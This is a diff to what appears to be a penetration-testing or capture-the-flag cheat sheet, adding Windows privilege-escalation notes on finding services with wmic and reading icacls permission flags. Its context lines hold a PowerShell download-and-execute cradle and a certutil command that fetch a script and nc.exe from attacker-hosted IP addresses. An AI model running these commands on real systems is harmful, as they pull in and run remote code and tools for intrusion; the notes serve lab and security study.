@@ -48,3 +48,31 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 ```bash
 certutil -urlcache -f http://10.9.53.25:8000/nc.exe nc.exe
 ```
+
+# Windows 
+
+## Windows Services
+
+To find:-
+
+```bash
+wmic service get name,startname,pathname | findstr /v C:\Windows
+```
+
+## icacls
+
+```bash
+USE:- icacls filename
+
+F - Full access
+M- Modify access
+RX - Read and execute access
+R - Read-only access
+W - Write-only access
+
+(OI) - Object inherit
+(CI) - Container inherit
+(IO) - Inherit only
+(NP) - Do not propagate inherit
+```
+
